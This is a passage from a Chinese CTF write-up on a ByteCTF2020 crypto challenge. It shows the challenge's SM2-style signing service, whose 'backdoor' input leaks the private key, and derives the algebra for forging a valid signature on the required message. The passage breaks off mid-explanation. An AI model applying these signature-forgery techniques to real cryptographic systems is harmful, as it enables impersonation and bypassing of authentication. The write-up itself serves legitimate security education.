class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF'</span>,</span><br><span class="line">    <span class="string">'g'</span>: <span class="string">'32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7'</span> +</span><br><span class="line">         <span class="string">'bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0'</span>,</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93'</span>,</span><br><span class="line">&#125;</span><br><span class="line">n = <span class="string">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span></span><br><span class="line">G = <span class="string">'32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7'</span> \</span><br><span class="line">    <span class="string">'bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(tsm2)</span></span><span class="symbol">:</span></span><br><span class="line">    data = func.random_hex(len(n)) </span><br><span class="line">    k1_str = func.random_hex(len(n))</span><br><span class="line">    print(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = input(<span class="string">'backdoor:'</span>).strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(tsm2)</span></span><span class="symbol">:</span></span><br><span class="line">    message = input(<span class="string">'msg:'</span>).strip().encode().strip(b<span class="string">'\x00'</span>)</span><br><span class="line">    sign = input(<span class="string">'sign:'</span>).strip().encode().strip(b<span class="string">'\x00'</span>)</span><br><span class="line">    check = tsm2.verify(sign, message)</span><br><span class="line">    <span class="keyword">if</span> check is True <span class="keyword">and</span> message == b<span class="string">'Hello, Welcome to ByteCTF2020!'</span><span class="symbol">:</span></span><br><span class="line">        print(FLAG)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        print(check)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TSM2</span>(<span class="title">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, sk)</span></span><span class="symbol">:</span></span><br><span class="line">        ecc_table = sm2p256v1_ecc_table</span><br><span class="line">        <span class="keyword">self</span>.ecc_table = ecc_table</span><br><span class="line">        <span class="keyword">self</span>.n = int(ecc_table[<span class="string">'n'</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.para_len = len(ecc_table[<span class="string">'n'</span>])</span><br><span class="line">        <span class="keyword">self</span>.ecc_a3 = (int(ecc_table[<span class="string">'a'</span>], base=<span class="number">16</span>) + <span class="number">3</span>) % int(ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.sk = int(sk, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.pk = <span class="keyword">self</span>._kg(<span class="keyword">self</span>.sk, ecc_table[<span class="string">'g'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">self</span>.sks = int(func.random_hex(<span class="keyword">self</span>.para_len), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">self</span>.pks = pow((<span class="keyword">self</span>.sk + <span class="number">1</span>) * <span class="keyword">self</span>.sks, <span class="keyword">self</span>.n - <span class="number">2</span>, <span class="keyword">self</span>.n) % <span class="keyword">self</span>.n</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_p1</span><span class="params">(<span class="keyword">self</span>, data, k1_str)</span></span><span class="symbol">:</span></span><br><span class="line">        e = int(data, <span class="number">16</span>)</span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        k1 = k1 % <span class="keyword">self</span>.n</span><br><span class="line">        R1 = <span class="keyword">self</span>._kg(k1, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>]) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%0128s'</span> % (e, R1) </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output_p1</span><span class="params">(<span class="keyword">self</span>, k1_str, r_s2_s3)</span></span><span class="symbol">:</span></span><br><span class="line">        r = int(r_s2_s3[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s2 = int(r_s2_s3[<span class="keyword">self</span>.<span class="symbol">para_len:</span><span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s3 = int(r_s2_s3[<span class="number">2</span> * <span class="keyword">self</span>.<span class="symbol">para_len:</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        d1 = <span class="keyword">self</span>.sks、</span><br><span class="line">        s = (d1 * k1 * s2 + d1 * s3 - r) % <span class="keyword">self</span>.n </span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span> <span class="keyword">or</span> s == (<span class="keyword">self</span>.n - r)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%064x'</span> % (r, s)  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(<span class="keyword">self</span>, Sign, data)</span></span><span class="symbol">:</span></span><br><span class="line">        r = int(Sign[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s = int(Sign[<span class="keyword">self</span>.<span class="symbol">para_len:</span><span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        e = int(data.hex(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % <span class="keyword">self</span>.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = <span class="keyword">self</span>._kg(s, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>])</span><br><span class="line">        P2 = <span class="keyword">self</span>._kg(t, <span class="keyword">self</span>.pk)、</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="symbol">P2:</span></span><br><span class="line">            P1 = <span class="string">'%s%s'</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = <span class="keyword">self</span>._double_point(P1)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            P1 = <span class="string">'%s%s'</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = <span class="keyword">self</span>._add_point(P1, P2)</span><br><span class="line">            P1 = <span class="keyword">self</span>._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = int(P1[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % <span class="keyword">self</span>.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_kg</span><span class="params">(<span class="keyword">self</span>, k, Point)</span></span>: </span><br><span class="line">        <span class="keyword">if</span> (k % <span class="keyword">self</span>.n) == <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'0'</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">'%s%s'</span> % (Point, <span class="string">'1'</span>)</span><br><span class="line">        mask_str = <span class="string">'8'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="keyword">self</span>.para_len - <span class="number">1</span>)<span class="symbol">:</span></span><br><span class="line">            mask_str += <span class="string">'0'</span></span><br><span class="line">        mask = int(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = False</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="keyword">self</span>.para_len * <span class="number">4</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">flag:</span></span><br><span class="line">                Temp = <span class="keyword">self</span>._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">                <span class="keyword">if</span> <span class="symbol">flag:</span></span><br><span class="line">                    Temp = <span class="keyword">self</span>._add_point(Temp, Point)</span><br><span class="line">                <span class="symbol">else:</span></span><br><span class="line">                    flag = True</span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._convert_jacb_to_nor(Temp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_double_point</span><span class="params">(<span class="keyword">self</span>, Point)</span></span>: </span><br><span class="line">        l = len(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; <span class="keyword">self</span>.para_len * <span class="number">2</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            x1 = int(Point[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = int(Point[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == <span class="symbol">len_2:</span></span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                z1 = int(Point[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (<span class="keyword">self</span>.ecc_a3 * T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span><span class="symbol">:</span></span><br><span class="line">                T4 = (T5 + ((T5 + int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)) <span class="meta">&gt;&gt; </span><span class="number">1</span>) - T3) % int(self.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                T4 = (T5 + (T5 <span class="meta">&gt;&gt; </span><span class="number">1</span>) - T3) % int(self.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_point</span><span class="params">(<span class="keyword">self</span>, P1, P2)</span></span>: </span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">'0'</span> * <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'%s%s'</span> % (P2, <span class="string">'1'</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">'0'</span> * <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'%s%s'</span> % (P1, <span class="string">'1'</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        l1 = len(P1)</span><br><span class="line">        l2 = len(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span class="keyword">or</span> (l2 &lt; len_2)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            X1 = int(P1[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            Y1 = int(P1[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l1 == <span class="symbol">len_2:</span></span><br><span class="line">                Z1 = <span class="number">1</span></span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                Z1 = int(P1[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line">            x2 = int(P2[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">            y2 = int(P2[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (Z1 * Z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y2 * Z1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x2 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T3 - X1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 + X1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 - Y1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            Z3 = (Z1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T3 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (T1 * T1) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (X1 * T4) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            X3 = (T5 - T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (Y1 * T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T4 - X3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * T3) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">            Y3 = (T1 - T2) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            <span class="keyword">return</span> form % (X3, Y3, Z3)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_convert_jacb_to_nor</span><span class="params">(<span class="keyword">self</span>, Point)</span></span>: </span><br><span class="line">        len_2 = <span class="number">2</span> * <span class="keyword">self</span>.para_len</span><br><span class="line">        x = int(Point[<span class="number">0</span><span class="symbol">:self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        y = int(Point[<span class="keyword">self</span>.<span class="symbol">para_len:</span>len_2], <span class="number">16</span>)</span><br><span class="line">        z = int(Point[<span class="symbol">len_2:</span>], <span class="number">16</span>)</span><br><span class="line">        z_inv = pow(z, int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>) - <span class="number">2</span>, int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>))</span><br><span class="line">        z_invSquar = (z_inv * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_invQube = (z_invSquar * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        x_new = (x * z_invSquar) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        y_new = (y * z_invQube) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        z_new = (z * z_inv) % int(<span class="keyword">self</span>.ecc_table[<span class="string">'p'</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> z_new == <span class="number">1</span><span class="symbol">:</span></span><br><span class="line">            form = <span class="string">'%%0%dx'</span> % <span class="keyword">self</span>.para_len</span><br><span class="line">            form = form * <span class="number">2</span></span><br><span class="line">            <span class="keyword">return</span> form % (x_new, y_new)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    sk = func.random_hex(len(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">    tsm2 = TSM2(sk)</span><br><span class="line">    print(<span class="string">'pk:%s'</span>   %tsm2.pk)</span><br><span class="line">    print(<span class="string">'pks:%064x'</span>%tsm2.pks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)<span class="symbol">:</span></span><br><span class="line">        op = input(<span class="string">'op: '</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'sign'</span><span class="symbol">:</span></span><br><span class="line">            sign(tsm2)</span><br><span class="line">        elif op == <span class="string">'verify'</span><span class="symbol">:</span></span><br><span class="line">            verify(tsm2)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            print(<span class="string">""</span><span class="string">"sign: sign message</span></span><br><span class="line"><span class="string">verify: verify message"</span><span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>啊，这第二题画风就突变，好长的代码，让人失去欲望。但其实呢，大部分都是对sm2的一个实现，其实不用细究。这里我们就直接先提取关键部分，一步一步来啦。</p><p>首先最上面的</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">sign</span>(tsm2):</span><br><span class="line">    data = func.random_hex(<span class="built_in">len</span>(n)) </span><br><span class="line">    k1_str = func.random_hex(<span class="built_in">len</span>(n))</span><br><span class="line">    <span class="keyword">print</span>(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = <span class="built_in">input</span>(<span class="string">'backdoor:'</span>).strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br><span class="line">def verify(tsm2):</span><br><span class="line">    message = <span class="built_in">input</span>(<span class="string">'msg:'</span>).strip().encode().strip(<span class="keyword">b</span><span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">sign</span> = <span class="built_in">input</span>(<span class="string">'sign:'</span>).strip().encode().strip(<span class="keyword">b</span><span class="string">'\x00'</span>)</span><br><span class="line">    check = tsm2.verify(<span class="keyword">sign</span>, message)</span><br><span class="line">    <span class="keyword">if</span> check <span class="keyword">is</span> True <span class="built_in">and</span> message == <span class="keyword">b</span><span class="string">'Hello, Welcome to ByteCTF2020!'</span>:</span><br><span class="line">        <span class="keyword">print</span>(FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(check)</span><br></pre></td></tr></table></figure><p>俩功能，一个是注册，一个是验证，获取flag的地方就是这个验证，他要求你对message进行一个签名，而message要求是b’Hello, Welcome to ByteCTF2020!’</p><p>好的，那我们看看咋样才能给这个message签上名，去找找签名的验证函数。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">def</span> verify(<span class="keyword">self, </span>Sign, <span class="meta">data</span>):</span><br><span class="line">    r = int(Sign[<span class="number">0</span>:<span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    s = int(Sign[<span class="keyword">self.para_len:2 </span>* <span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    e = int(<span class="meta">data</span>.hex(), <span class="number">16</span>)</span><br><span class="line">    t = (r + s) % <span class="keyword">self.n</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">if</span> t == <span class="number">0</span>:</span><br><span class="line">        return <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">P1</span> = <span class="keyword">self._kg(s, </span><span class="keyword">self.ecc_table['g'])</span></span><br><span class="line"><span class="keyword"> </span>   <span class="built_in">P2</span> = <span class="keyword">self._kg(t, </span><span class="keyword">self.pk)</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">if</span> <span class="built_in">P1</span> == <span class="built_in">P2</span>:</span><br><span class="line">        <span class="built_in">P1</span> = <span class="string">'%s%s'</span> % (<span class="built_in">P1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._double_point(P1)</span></span><br><span class="line"><span class="keyword"> </span>   <span class="meta">else</span>:</span><br><span class="line">        <span class="built_in">P1</span> = <span class="string">'%s%s'</span> % (<span class="built_in">P1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._add_point(P1, </span><span class="built_in">P2</span>)</span><br><span class="line">        <span class="built_in">P1</span> = <span class="keyword">self._convert_jacb_to_nor(P1)</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"> </span>   x = int(<span class="built_in">P1</span>[<span class="number">0</span>:<span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    return r == ((e + x) % <span class="keyword">self.n)</span></span><br></pre></td></tr></table></figure><p>这个验证函数有三个输入：r，s，e，然后这里有一个self._kg ，这个其实就是一个椭圆曲线上的一个乘法，所以P1 = s * g，g是椭圆曲线上的一个基点，P2 = t * pk ，代码前头有对pk的定义 <code>self.pk = self._kg(self.sk, ecc_table[&#39;g&#39;])</code>,所以就是P2 = ((r+s)%n) * sk * g，接下来的操作不难看出，这里就是两个点相加，这里可以print出来看一下输出，是一个点的坐标的十六进制表示的字符串的拼接，x就是这个点的x坐标。最后是一个判断 r == ((e + x) % self.n)</p><p>首先e是固定的 b’Hello, Welcome to ByteCTF2020!’。我们能操作的就是r和s了，x是一个算出来的坐标，为了让这个判断成立，我们就需要构造我们的输入r，为了构造r得提前算出P1的x坐标，而P1=P1+P2 = s * g + ((r + s)%n) * sk * g。乍一看我们好像陷入了死锁。这里头怎么又出现了r？</p><p>换个思路想想，虽然这里的P1是后来根据我们的输入算出来的，但其实我们也可以先固定这个P1。最后再精心构造一下输入，让他正好算出来是这个P1，</p><p>所以假设我们已经知道最后的点P1了，就当他是2g好了，这样我们就可以算出x了，有了x，那么r也就固定下来了，那我们就就只需要构造s让它算出这个P1点了。</p><p>我们知道，虽然椭圆曲线的加法和乘法不同于普通的四则运算，但是一些运算法则还是适用的，比如分配律、交换律这些，所以式子：P1=P1+P2 = s * g + ((r + s)%n) * sk * g 可以做一些变形，我们已经知道P1=2g了，外加这条曲线的阶是n（我承认我有赌的成分），所以有</p><p>$2*g \equiv  s * g + (r + s) * sk * g \pmod n$</p><p>$2 \equiv  s + (r+s)* sk \pmod n$</p><p>$2 \equiv s*(sk+1) + r *sk  \pmod n$</p><p>$s \equiv (2 -r*sk) *( sk+1)^{-1} \pmod n$</p><p>其中r确定了，n确定了，只剩sk了，而sk其实也就是相当于这条椭圆曲线的私钥</p><p>这是我们得回过头来看最初的sign函数了</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def sign(tsm2):</span><br><span class="line">    data = <span class="function"><span class="keyword">func</span>.<span class="title">random_hex</span><span class="params">(len<span class="params">(n)</span></span></span>) </span><br><span class="line">    k1_str = <span class="function"><span class="keyword">func</span>.<span class="title">random_hex</span><span class="params">(len<span class="params">(n)</span></span></span>)</span><br><span class="line">    <span class="built_in">print</span>(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = input('backdoor:').strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>不能再明显了，backdoor都写给你了，显然是要利用这里来整到sk，</p><p>data和k1_str都是不可控的随机数，</p><p>然后print了send_p1函数的输出，</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_p1</span><span class="params">(<span class="keyword">self</span>, data, k1_str)</span></span><span class="symbol">:</span></span><br><span class="line">        e = int(data, <span class="number">16</span>)</span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        k1 = k1 % <span class="keyword">self</span>.n</span><br><span class="line">        R1 = <span class="keyword">self</span>._kg(k1, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>]) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%0128s'</span> % (e, R1)</span><br></pre></td></tr></table></figure><p>给的是data和一个R1，R1是k1 * 